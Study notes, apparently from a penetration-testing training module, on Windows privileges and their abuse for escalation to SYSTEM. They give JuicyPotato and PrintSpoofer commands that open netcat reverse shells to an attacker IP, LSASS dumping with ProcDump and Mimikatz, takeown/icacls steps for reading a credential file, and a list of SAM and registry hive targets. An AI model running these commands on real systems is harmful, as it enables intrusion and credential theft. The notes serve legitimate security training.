## 1- Windows Privileges Overview
**Windows privileges** are special rights that let an account perform system-level actions (e.g., manage services, load drivers, shut down, debug). They differ from **access rights**, which control access to objects. Privileges are stored in a database, assigned via an **access token** at logon, and can vary per system or domain. The system checks the token for required privileges, which are usually **disabled by default** and may need to be enabled.

In security assessments, the goal is often **administrative access**. If a user has certain privileges, they can be abused to **escalate privileges** or expand access on the system.
#### Windows Authorization Process
**Security principals** are entities Windows can authenticate (users, computers, processes, and groups). They control access to resources and are uniquely identified by a **Security Identifier (SID)** that remains for their lifetime.

When a user accesses a resource, Windows compares the user’s **access token** (user SID, group SIDs, privileges) with the object’s **ACL/ACEs** in its security descriptor. Based on this check, access is **granted or denied** instantly. During enumeration and privilege escalation, attackers try to **abuse access rights or this authorization process** to gain higher access.
![[Pasted image 20260113201525.png]]

#### Rights and Privileges in Windows
Windows has many **built-in groups** that grant powerful rights. Membership in these groups can be **abused for privilege escalation** on standalone systems or in **Active Directory** environments, potentially leading to **local admin, SYSTEM, or Domain Admin** access on workstations, servers, or Domain Controllers.

|**Group**|**Description**|
|---|---|
|Default Administrators|Domain Admins and Enterprise Admins are "super" groups.|
|Server Operators|Members can modify services, access SMB shares, and backup files.|
|Backup Operators|Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|
|Print Operators|Members can log on to DCs locally and "trick" Windows into loading a malicious driver.|
|Hyper-V Administrators|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|
|Account Operators|Members can modify non-protected accounts and groups in the domain.|
|Remote Desktop Users|Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol.|
|Remote Management Users|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|
|Group Policy Creator Owners|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|
|Schema Admins|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|
|DNS Admins|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/).|
#### User Rights Assignment
User rights depend on **group membership** and **local/domain Group Policy**. These **User Rights Assignments** define what actions a user can perform on a system (e.g., local or remote logon, network access, shutting down the server) and are applied at the **local host level**.

|Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)|Setting Name|Standard Assignment|Description|
|---|---|---|---|
|SeNetworkLogonRight|[Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)|Administrators, Authenticated Users|Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.|
|SeRemoteInteractiveLogonRight|[Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)|Administrators, Remote Desktop Users|This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.|
|SeBackupPrivilege|[Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)|Administrators|This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.|
|SeSecurityPrivilege|[Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)|Administrators|This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.|
|SeTakeOwnershipPrivilege|[Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)|Administrators|This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.|
|SeDebugPrivilege|[Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)|Administrators|This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.|
|SeImpersonatePrivilege|[Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)|Administrators, Local Service, Network Service, Service|This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.|
|SeLoadDriverPrivilege|[Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)|Administrators|This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.|
|SeRestorePrivilege|[Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)|Administrators|This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.|
|SeTcbPrivilege|[Act as part of the operating system](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system)|Administrators, Local Service, Network Service, Service|This security setting determines whether a process can assume the identity of any user and, through this, obtain access to resources that the targeted user is permitted to access (impersonation). This may be assigned to antivirus or backup tools that need the ability to access all system files for scans or backups. This privilege should be reserved for service accounts requiring this access for legitimate activities.|
Further information can be found [here](https://4sysops.com/archives/user-rights-assignment-in-windows-server-2016/).

Typing the command `whoami /priv` will give you a listing of all user rights assigned to your current user. Some rights are only available to administrative users and can only be listed/leveraged when running an elevated cmd or PowerShell session. These concepts of elevated rights and [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) are security features introduced with Windows Vista to default to restricting applications from running with full permissions unless necessary. If we compare and contrast the rights available to us as an admin in a non-elevated console vs. an elevated console, we will see that they differ drastically.

Below are the rights available to a local administrator account on a Windows system.
##### Local Admin User Rights - Elevated
If we run an elevated command window, we can see the complete listing of rights available to us:
```powershell
whoami 
  # winlpe-srv01\administrator
whoami /priv
  # SeTakeOwnershipPrivilege - Take ownership of files or other objects - Disabled
  # ......
```
When a privilege is listed for our account in the `Disabled` state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled. Windows does not provide a built-in command or PowerShell cmdlet to enable privileges, so we need some scripting to help us out. We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process. One example is this PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.
##### Standard User Rights
A standard user, in contrast, has drastically fewer rights.
```powershell
whoami 
  # winlpe-srv01\htb-student
whoami /priv
  # SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
```
##### Backup Operators Rights
User rights increase based on the groups they are placed in or their assigned privileges. Below is an example of the rights granted to users in the `Backup Operators` group. Users in this group do have other rights that UAC currently restricts. Still, we can see from this command that they have the [SeShutdownPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system), which means that they can shut down a domain controller that could cause a massive service interruption should they log onto a domain controller locally (not via RDP or WinRM).
```powershell
whoami /priv
  # SeShutdownPrivilege           Shut down the system           Disabled
```
#### Detection
This [post](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event [4672: Special privileges assigned to new logon](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672) which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts.


---

## 2- SeImpersonate and SeAssignPrimaryToken
In Windows, each process has an access token that defines the running account. Tokens live in memory and aren’t secure by themselves; using them requires the **SeImpersonate** privilege, usually limited to admins and often removed during hardening. A common API example is **CreateProcessWithTokenW**.

Legitimate programs can use another process’s token to escalate from **Administrator** to **SYSTEM** (often via **WinLogon**). Attackers abuse this in **“Potato”** privilege escalations, tricking a SYSTEM process into connecting and handing over its token.

We will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account (for example, uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries). Whenever we gain access in this way, we should immediately check for this privilege as its presence often offers a quick and easy route to elevated privileges. This [paper](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) is worth reading for further details on token impersonation attacks.

####  SeImpersonate Example - JuicyPotato  
**Example**: after gaining access to a `SQL Server with a privileged SQL user`, services like **IIS** and **SQL Server** using **Windows Authentication** may need to access other resources (e.g., file shares) as the client. This is done by impersonating the client’s user context, which requires the **[Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)** privilege.

In this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.
###### Connecting with MSSQLClient.py
Using the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the `Impacket` toolkit.
```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
###### Enabling xp_cmdshell
Next, we must enable the `xp_cmdshell` stored procedure to run operating system commands. We can do this via the Impacket MSSSQL shell by typing `enable_xp_cmdshell`. Typing `help` displays a few other command options.
```bash
SQL> enable_xp_cmdshell
```
> We don't actually have to type `RECONFIGURE` as Impacket does this for us.
###### Confirming Access
With this access, we can confirm that we are indeed running in the context of a SQL Server service account.
```bash
SQL> xp_cmdshell whoami
  # nt service\mssql$sqlexpress01
```
###### Checking Account Privileges
```bash
SQL> xp_cmdshell whoami /priv
  # SeImpersonatePrivilege  Impersonate a client after authentication Enabled 
  # SeAssignPrimaryTokenPrivilege Replace a process level token   Disabled      
```
The command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.
##### Escalating Privileges Using JuicyPotato
To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.
```bash
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
##### Catching SYSTEM Shell
This completes successfully, and a shell as `NT AUTHORITY\SYSTEM` is received.
```bash
sudo nc -lnvp 8443
whoami
  # nt authority\system
```
#### PrintSpoofer and RoguePotato
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges **on Windows 10 and Server 2019** hosts where JuicyPotato no longer works.
##### Escalating Privileges using PrintSpoofer
Let's try this out using the `PrintSpoofer` tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).
```bash
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
##### Catching Reverse Shell as SYSTEM
If all goes according to plan, we will have a SYSTEM shell on our netcat listener.
```bash
nc -lnvp 8443
whoami
  # nt authority\system
```


---

## 3- SeDebugPrivilege

To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.

During an internal penetration test, it is often helpful to use websites such as LinkedIn to gather information about potential users to target. Suppose we are, for example, retrieving many NTLMv2 password hashes using `Responder` or `Inveigh`. In that case, we may want to focus our password hash cracking efforts on possible high-value accounts, such as developers who are more likely to have these types of privileges assigned to their accounts. A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.
![[Pasted image 20260114143619.png]]
#### Dump LSASS 
After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.
```powershell
whoami /priv
  # SeDebugPrivilege       Debug programs         Disabled
```
We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.
```cmd
procdump.exe -accepteula -ma lsass.exe c:\Tools\Procdump\lsass.dmp
```
This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).
>It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.
```powershell
mimikatz.exe
log 
  # Using 'mimikatz.log' for logfile : OK
sekurlsa::minidump  c:\Tools\Procdump\lsass.dmp
  # Switch to MINIDUMP : 'lsass.dmp'   |  (told Mimikatz: Stop using live LSASS memory and use this dump file instead.)
sekurlsa::logonpasswords
  # Opening : 'lsass.dmp' file for minidump...  
```

or simply  **live dump** the **lsass**
```powershell 
privilege::debug  # Privilege '20' OK
sekurlsa::logonpasswords
```

Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.
![[Pasted image 20260114150100.png]]
#### Remote Code Execution as SYSTEM
We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let's see this in action.

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.
>The PoC script has received an update. Please visit its GitHub repository and review its usage. https://github.com/decoder-it/psgetsystem

First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.

First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.
```powershell
tasklist 
  # winlogon.exe                   612 Console                    1     10,408 K
```
Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.
```powershell
.\psgetsys.ps1 `[MyProcess]::CreateProcessFromParent(612,c:\Windows\System32\cmd.exe,"")`
```
![[Pasted image 20260114151209.png]]
We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.
![[Pasted image 20260114150712.png]]

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with `SeDebugPrivilege`. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that's outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.


---
## 4- SeTakeOwnershipPrivilege
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor. Administrators are assigned this privilege by default. While it is rare to encounter a standard user account with this privilege, we may encounter a service account that, for example, is tasked with running backup jobs and VSS snapshots assigned this privilege. It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights. These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.
![[Pasted image 20260114200834.png]]

The setting can be set in Group Policy under:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`
- ![[Pasted image 20260114200901.png]]
With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).

Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse). In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.
### Leveraging the Privilege
#### Reviewing Current User Privileges
Let's review our current user's privileges.
```powershell
whoami /priv
  # SeTakeOwnershipPrivilege  Take ownership of files or other objects  Disabled
```
#### Enabling SeTakeOwnershipPrivilege
**Notice from the output that the privilege is not enabled. We can enable it using this** [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post , as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
  # SeTakeOwnershipPrivilege  Take ownership of files or other objects Enabled
```
#### Choosing a Target File
Choose a target file and check its ownership. **File shares** often contain **Public** and **Private** directories, sometimes with misconfigured permissions. After gaining (or even without) AD access, these shares can reveal valuable information. In this scenario, we can browse both Public and Private shares. Public contains nothing interesting, but in Private we can list some directories without reading most files. During enumeration, we discover a file named **cred.txt** in the **IT** subdirectory of the Private share.

Given that our user account has `SeTakeOwnershipPrivilege` (which may have already been granted), or we exploit some other misconfiguration such as an overly permissive Group Policy Object (GPO) to grant our user account that privilege) we can leverage it to read any file of our choosing.
>Note: Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.

#### Checking File Ownership
Let's check out our target file to gather a bit more information about it
```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
  # FullName               LastWriteTime                          Attributes Owner
  # C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```
We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.
```powershell
cmd /c dir /q 'C:\Department Shares\Private\IT'
  # 06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
  # 06/18/2021  12:23 PM                36 ...                    cred.txt
```
We can see that the IT share appears to be owned by a service account and does contain a file `cred.txt` with some data inside it.
#### Taking Ownership of the File
Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.
```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
   # SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```
#### Confirming Ownership Changed
We can confirm ownership using the same command as before. We now see that our user account is the file owner.
```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
  # cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```
#### Modifying the File ACL
We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.
```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
  # cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
```
Let's grant our user full privileges over the target file.
```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
#### Reading the File
If all went to plan, we can now read the target file from the command line, open it if we have RDP access, or copy it down to our attack system for additional processing (such as cracking the password for a KeePass database.
```powershell
cat 'C:\Department Shares\Private\IT\cred.txt' # root:n1X_p0wer_us3er!
```
After making changes, revert permissions or ownership if possible. If not, inform the client and document the changes in the report. This action is potentially destructive, so it must be used carefully, and some clients may prefer proof of the misconfiguration without exploiting it fully.
#### When to Use?
##### Files of Interest
Some local files of interest may include:
```shell
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.

